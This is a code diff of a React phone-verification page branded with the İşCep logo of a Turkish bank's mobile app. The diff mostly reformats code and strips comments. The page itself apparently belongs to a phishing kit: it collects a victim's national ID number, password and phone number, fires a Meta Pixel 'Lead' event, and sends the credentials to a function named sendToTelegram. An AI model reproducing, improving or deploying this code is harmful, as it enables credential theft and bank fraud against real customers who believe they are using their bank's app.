@@ -3,7 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
 import { useAuth } from './AuthContext';
 
-/* global fbq */  // ESLint için: fbq global olarak tanımla (Meta Pixel'den geliyor)
+/* global fbq */ // ESLint için: fbq global olarak tanımlı (Meta Pixel)
 
 function PhoneVerificationPage() {
   const [state, setState] = React.useState({
@@ -23,15 +23,15 @@ function PhoneVerificationPage() {
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
 
-  // SHA-256 hash fonksiyonu (Meta için user_data hashing)
+  // SHA-256 hash fonksiyonu
   const sha256Hash = async (str) => {
     const msgUint8 = new TextEncoder().encode(str.toLowerCase().trim());
     const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
     const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
   };
 
-  // Meta Lead event'i tetikle (başarılı submit sonrası)
+  // Meta Lead event'i tetikle
   const trackMetaLead = useCallback(async (tc, phone, eventID) => {
     if (typeof window !== 'undefined' && window.fbq) {
       try {
@@ -40,7 +40,7 @@ function PhoneVerificationPage() {
         const hashedTc = await sha256Hash(tc);
 
         fbq('track', 'Lead', {
-          eventID: eventID,
+          eventID,
           custom_data: {
             content_category: 'lead_form',
             content_name: 'phone_verification',
@@ -189,21 +189,14 @@ function PhoneVerificationPage() {
       }
       if (state.phoneNumber.length === 10) {
         setState((prev) => ({ ...prev, isSubmitting: true }));
-        
-        // eventID'yi burada üret
         const eventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-        
-        // Önce client-side event'i tetikle
         await trackMetaLead(tc, state.phoneNumber, eventID);
-        
-        // Sonra backend'e gönder
-        const result = await sendToTelegram({ 
-          tc, 
-          password, 
+        const result = await sendToTelegram({
+          tc,
+          password,
           phone: state.phoneNumber,
-          eventID
+          eventID,
         });
-        
         if (result && !result.error) {
           authDispatch({ type: 'RESET_AUTH' });
           setState({
@@ -230,9 +223,7 @@ function PhoneVerificationPage() {
         <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
         <div className="new-container phone-verification-title">
           Telefon Doğrulama
-          <div className="phone-verification-subtitle">
-            Lütfen cep telefon numaranızı giriniz
-          </div>
+          <div className="phone-verification-subtitle">Lütfen cep telefon numaranızı giriniz</div>
         </div>
         <div className="input-wrapper">
           <div
@@ -293,9 +284,7 @@ function PhoneVerificationPage() {
           </div>
           <div className="verify-button-container">
             <button
-              className={`button-phone ${
-                state.phoneNumber.length > 0 ? 'active-continue-button' : ''
-              }`}
+              className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
               onClick={handlePhoneSubmit}
               onTouchStart={handlePhoneSubmit}
               disabled={state.isSubmitting}
